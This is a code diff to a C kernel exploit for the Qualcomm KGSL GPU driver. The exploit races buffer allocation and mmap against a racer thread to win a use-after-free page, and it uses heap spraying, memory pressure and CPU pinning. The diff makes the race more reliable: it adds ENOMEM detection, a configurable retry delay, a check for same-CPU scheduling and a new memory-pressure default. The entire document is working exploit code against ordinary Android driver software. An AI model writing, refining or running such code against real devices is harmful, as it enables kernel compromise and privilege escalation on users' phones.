@@ -132,8 +132,10 @@ static size_t g_pressure_bytes = 2560UL * 1024 * 1024;
 static int g_racer_count = 1;
 static int g_race_delay_us = -1;      /* < 0: sweep 0..measured ioctl time */
 static int g_race_delay_fixed;
+static int g_race_retry_ms = 200;
+static int g_last_race_errno;
 static int64_t g_last_ioctl_us;
-static int g_pressure_hold = 1;
+static int g_pressure_hold;
 static void *g_pressure_map;
 static size_t g_pressure_size;
 static volatile int race_go;
@@ -544,6 +546,7 @@ static void *bogus_racer(void *arg) {
 }
 
 static int race_once(int *out_fd, uint64_t *uaf_page) {
+    g_last_race_errno = 0;
     int fd = open("/dev/kgsl-3d0", O_RDWR | O_NONBLOCK);
     if (fd < 0) { perror("open kgsl"); return -1; }
     unsigned uaf_id=0, overlap_id=0, ph_id=0;
@@ -552,7 +555,10 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
     uint64_t uaf_mmap_size=0, overlap_mmap_size=0, ph_mmap_size=0;
 
     struct kgsl_gpuobj_alloc a = { .size = UAF_SIZE, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) { perror("alloc uaf"); close(fd); return -1; }
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) {
+        if (errno == ENOMEM) g_last_race_errno = ENOMEM;
+        perror("alloc uaf"); close(fd); return -1;
+    }
     uaf_id = a.id; uaf_mmap_size = a.mmapsize;
     uaf_vma = mmap((void *)UAF_START, uaf_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED_NOREPLACE, fd, (off_t)uaf_id<<12);
     if (uaf_vma == MAP_FAILED) { perror("mmap uaf"); goto fail; }
@@ -598,6 +604,7 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
 
     int mmap_err = 0;
     int won = 0;
+    int mmap_enomem = 0;
     if (created > 0) {
         for (int spin = 0; spin < 2000000; spin++) {
             int any = 0;
@@ -621,6 +628,8 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
                 won = 1;
                 break;
             }
+            if (overlap_vma == MAP_FAILED && mmap_err == ENOMEM)
+                mmap_enomem = 1;
             if (overlap_vma != MAP_FAILED) {
                 /* The overlap VMA has already replaced the first bogus
                  * hostptr page, so retrying this setup cannot hit the race
@@ -641,10 +650,19 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
         pthread_join(th[i], NULL);
 
     int64_t ioctl_us = 0;
+    int racer_enomem = 0;
     for (int i = 0; i < created; i++) {
+        if (ra[i].ret != 0 && ra[i].err == ENOMEM) {
+            racer_enomem = 1;
+            continue;
+        }
         int64_t duration = ra[i].t1_us - ra[i].t0_us;
         if (duration > ioctl_us) ioctl_us = duration;
     }
+    if (mmap_enomem || racer_enomem) g_last_race_errno = ENOMEM;
+    /* A failed ioctl returns early, so its duration says nothing about the
+     * real window; keep the last good measurement instead of poisoning the
+     * sweep with it. */
     if (ioctl_us > 0) g_last_ioctl_us = ioctl_us;
     if (verbose && ioctl_us > 0)
         printf("[*] racer ioctl took %lldus (mmap delay %dus)\n",
@@ -2059,6 +2077,11 @@ static int pin_parent_for_spray(void) {
     }
     printf("[*] pinning child allocation to CPU %d, race mmap on CPU %d, racer(s) on CPU %d\n",
            g_park_cpu, g_park_cpu, g_race_cpu);
+    if (g_race_cpu == g_park_cpu)
+        fprintf(stderr,
+                "[-] no second CPU for the race: the mmap and the racer are"
+                " both on CPU %d (unset KGSL_CPU/KGSL_RACE_CPU or pick two"
+                " CPUs)\n", g_park_cpu);
     return 0;
 }
 
@@ -2280,7 +2303,16 @@ int main(int argc, char **argv) {
         g_race_delay_us = (int)configured_delay;
         g_race_delay_fixed = 1;
     }
-    g_pressure_hold = env_flag("KGSL_PRESSURE_HOLD", 1);
+    long configured_retry = 0;
+    env_status = read_env_long("KGSL_RACE_RETRY_MS", 0, 5000,
+                               &configured_retry);
+    if (env_status < 0) {
+        fprintf(stderr, "[-] KGSL_RACE_RETRY_MS must be between 0 and 5000\n");
+        return 2;
+    }
+    if (env_status > 0)
+        g_race_retry_ms = (int)configured_retry;
+    g_pressure_hold = env_flag("KGSL_PRESSURE_HOLD", 0);
     if (!children_set || !pressure_set)
         choose_spray_defaults(children_set, pressure_set);
     printf("[*] spray profile children=%d pressure=%zu MiB racers=%d delay=",
@@ -2289,7 +2321,8 @@ int main(int argc, char **argv) {
         printf("%dus\n", g_race_delay_us);
     else
         printf("auto-sweep\n");
-    printf("[*] pressure hold=%d\n", g_pressure_hold);
+    printf("[*] pressure hold=%d retry=%dms\n", g_pressure_hold,
+           g_race_retry_ms);
     if (sec_sid_mode && getenv("SEC_LOG")) {
         void *log = mmap(NULL, SEC_LOG_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -2354,12 +2387,24 @@ int main(int argc, char **argv) {
             return 1;
         }
 
+        int enomem_tries = 0;
         for (int attempt = 0; attempt < MAX_RACE_TRIES; attempt++) {
             g_race_delay_us = race_delay_for_try(attempt);
             printf("[*] race try %d delay=%dus\n", attempt + 1,
                    g_race_delay_us);
             if (race_once(&fd, &uaf_gpu) == 0) break;
-            usleep(20000);
+            if (g_last_race_errno == ENOMEM)
+                enomem_tries++;
+            else
+                enomem_tries = 0;
+            if (g_race_retry_ms > 0)
+                usleep((useconds_t)g_race_retry_ms * 1000);
+        }
+        if (fd < 0 && enomem_tries == MAX_RACE_TRIES) {
+            fprintf(stderr,
+                    "[-] KGSL returned ENOMEM on every try: the driver pool"
+                    " is exhausted. Reboot the device before retrying.\n");
+            return 1;
         }
         if (fd < 0) {
             fprintf(stderr, "[-] race not won\n");
